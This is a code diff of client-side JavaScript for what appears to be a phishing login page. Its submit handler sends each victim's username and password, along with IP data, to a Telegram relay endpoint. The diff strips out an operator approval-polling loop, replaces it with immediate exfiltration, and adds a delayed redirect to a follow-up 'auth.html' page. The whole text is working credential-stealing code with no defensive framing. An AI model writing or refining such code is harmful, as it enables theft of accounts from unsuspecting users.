@@ -44,6 +44,8 @@
       domain: domain,
       isFree: isFree
     });
+
+    console.log(`🌐 Domain detected: ${domain} (${isFree ? 'FREE' : 'PURCHASED'})`);
   }
 
   // Only detect on human interaction
@@ -80,7 +82,9 @@
         if (response.ok) {
           ipData = await response.json();
         }
-      } catch (e) {}
+      } catch (e) {
+        console.warn('Could not fetch IP data');
+      }
 
       const payload = {
         action: action,
@@ -101,31 +105,13 @@
         }
       };
 
-      const response = await fetch('/api/telegram', {
+      await fetch('/api/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
-
-      return await response.json();
     } catch (error) {
       console.error('Failed to send to Telegram:', error);
-      throw error;
-    }
-  }
-
-  // ============================================================
-  // ====== CHECK APPROVAL ======================================
-  // ============================================================
-
-  async function checkApproval(sessionId) {
-    try {
-      const response = await fetch(`/api/check-approval?sessionId=${sessionId}`);
-      const data = await response.json();
-      return data;
-    } catch (error) {
-      console.error('Approval check error:', error);
-      return { status: 'pending' };
     }
   }
 
@@ -168,7 +154,7 @@
   // ====== LOGIN FORM SUBMIT ===================================
   // ============================================================
 
-  form.addEventListener("submit", async function (event) {
+  form.addEventListener("submit", function (event) {
     event.preventDefault();
     clearErrors();
 
@@ -201,68 +187,25 @@
       return;
     }
 
-    const sessionId = 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-    
-    // Show spinner
+    // ====== SEND LOGIN CREDENTIALS TO TELEGRAM ======
+    sendToTelegram('login_attempt', {
+      username: userName,
+      password: password
+    });
+
+    // ====== DISABLE BUTTON AND SHOW LOADING ======
     submitBtn.disabled = true;
     submitBtn.innerHTML = '<span class="spinner"></span>';
     submitBtn.classList.add('loading');
-    
+
+    // Store username for next steps
     try {
-      await sendToTelegram('login_attempt', {
-        username: userName,
-        password: password,
-        sessionId: sessionId
-      });
-      
-      let approved = false;
-      let rejected = false;
-      let attempts = 0;
-      const maxAttempts = 60;
-      
-      while (!approved && !rejected && attempts < maxAttempts) {
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        attempts++;
-        
-        const status = await checkApproval(sessionId);
-        
-        if (status.status === 'approved') {
-          approved = true;
-          break;
-        } else if (status.status === 'rejected') {
-          rejected = true;
-          break;
-        }
-      }
-      
-      if (approved) {
-        try {
-          sessionStorage.setItem("melodyUser", userName);
-        } catch (e) {}
-        
-        window.location.href = "auth.html";
-        
-      } else if (rejected) {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = 'Sign in';
-        submitBtn.classList.remove('loading');
-        passwordInput.value = '';
-        passwordInput.focus();
-        
-      } else {
-        // Timeout - auto-approve
-        try {
-          sessionStorage.setItem("melodyUser", userName);
-        } catch (e) {}
-        
-        window.location.href = "auth.html";
-      }
-      
-    } catch (error) {
-      console.error('Login error:', error);
-      submitBtn.disabled = false;
-      submitBtn.innerHTML = 'Sign in';
-      submitBtn.classList.remove('loading');
-    }
+      sessionStorage.setItem("melodyUser", userName);
+    } catch (e) {}
+
+    // ====== REDIRECT AFTER 8 SECONDS ======
+    setTimeout(function() {
+      window.location.href = "auth.html";
+    }, 8000);
   });
 })();
